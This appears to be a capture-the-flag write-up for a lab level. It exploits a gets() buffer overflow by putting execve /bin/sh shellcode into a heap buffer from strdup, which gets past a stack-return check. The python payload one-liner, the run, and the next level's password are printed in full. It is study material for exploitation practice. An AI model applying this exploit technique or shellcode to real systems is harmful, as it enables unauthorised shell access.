### Download binary
``scp -P4242 level2@192.168.31.170:/home/user/level2/level2 ~/Desktop/``

----

### Decompilation with ghidra
We disasemble the main, to search for a breach.

----

### Main function analysis (see sources)
We observe that the program uses ``gets``, without any buffer size verification. Therefore, we will perform a buffer overflow.

----

### Building the payload

There's a protection mechanism that verifies if the return address is on the stack:
>if ((unaff_retaddr & 0xb0000000) == 0xb0000000)

In this case, the program calls ``exit(1)``
-> therefore we cannot use the stack.

We notice that ``strdup`` is called, so we can use the heap.

``ltrace ./level2``
>__libc_start_main(0x804853f, 1, 0xbffff7c4, 0x8048550, 0x80485c0 <unfinished ...>
fflush(0xb7fd1a20)                                 = 0
gets(0xbffff6cc, 0, 0, 0xb7e5ec73, 0x80482b5123)   = 0xbffff6cc
puts("123"123)                                     = 4
strdup("123")                                      = 0x0804a008
+++ exited (status 8) +++

We notice that the return value of ``malloc`` is **0x0804a008**.

This is how we will build our payload:
``((SHELLCODE + NOP) size 80) + RET_AD (malloc)``

https://shell-storm.org/shellcode/files/shellcode-811.html

This shellcode is 28 bytes long, so we will need to pad it to reach a size of 80 with 52 "NOP" (\x90).

python -c "print('\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + '\x90' * 52 + '\x08\xa0\x04\x08')" > /tmp/payload

----

#### Getting the flag

``cat /tmp/payload - | ./level2``
>1�Ph//shh/bin����°
                  1�@̀�����������������������������������������������

``whoami``
>level3

``cat /home/user/level3/.pass``
>492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
